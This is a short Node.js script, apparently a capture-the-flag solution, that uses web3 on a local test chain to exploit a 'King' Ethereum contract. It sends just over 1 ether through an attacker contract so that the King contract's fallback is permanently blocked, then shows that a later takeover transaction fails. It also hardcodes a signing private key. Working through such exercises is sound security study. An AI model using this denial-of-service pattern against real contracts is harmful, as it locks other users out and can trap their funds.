// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const exploit = require('./build/contracts/Exploit.json');
const king = require('./build/contracts/King.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();
  const exploitAddress = exploit.networks[networkId].address;
  const exploitContract = new web3.eth.Contract(exploit.abi, exploitAddress);
  const kingAddress = king.networks[networkId].address;
  const kingContract = new web3.eth.Contract(king.abi, kingAddress);

  let prize = await kingContract.methods.prize().call({from: publicKey});
  let kingInstance = await kingContract.methods.king().call({from: publicKey});
  console.log('Current prize:', prize, 'for king', kingInstance);

  // To become king we have to send > 1 Ether to the King contract to brick it.
  console.log("Bricking king contract's fallback function");
  await exploitContract.methods
    .pwn()
    .send({from: publicKey, value: 1000000000000000001});

  prize = await kingContract.methods.prize().call({from: publicKey});
  kingInstance = await kingContract.methods.king().call({from: publicKey});
  console.log('Current prize:', prize, 'for king', kingInstance);

  const count = await web3.eth.getTransactionCount(publicKey);
  // We're trying to call King's fallback function with enough value (1 Wei
  // more) to become the new king, but it will fail because we bricked the
  // contract.
  const rawTx = {
    from: publicKey,
    to: kingAddress,
    nonce: web3.utils.toHex(count),
    gasPrice: web3.utils.toHex(web3.utils.toWei('21', 'gwei')),
    gasLimit: web3.utils.toHex(210000),
    value: web3.utils.toHex(1000000000000000002),
    data: '',
  };
  var tx = new Tx(rawTx);
  tx.sign(Buffer.from(privateKey, 'hex'));
  try {
    await web3.eth.sendSignedTransaction('0x' + tx.serialize().toString('hex'));
  } catch (e) {
    console.log('Contract is bricked', e);
  }
})();
